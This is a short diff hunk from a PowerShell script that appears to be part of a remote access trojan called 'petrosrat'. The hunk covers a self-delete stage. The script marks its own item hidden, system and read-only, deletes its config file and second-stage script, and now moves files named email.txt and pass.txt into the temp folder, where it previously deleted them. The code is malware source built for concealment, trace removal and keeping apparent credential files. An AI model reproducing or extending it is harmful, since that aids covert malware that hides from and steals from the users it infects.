@@ -83,8 +83,8 @@ attrib +h +s +r petrosrat
 # self delete
 Set-Location $initial_dir
 Remove-Item $configfile
-Remove-Item email.txt
-Remove-Item pass.txt
+Move-Item email.txt $env:temp
+Move-Item pass.txt $env:temp
 Remove-Item stage2.ps1
 
 # I Have to add the location where to delete these (cd)
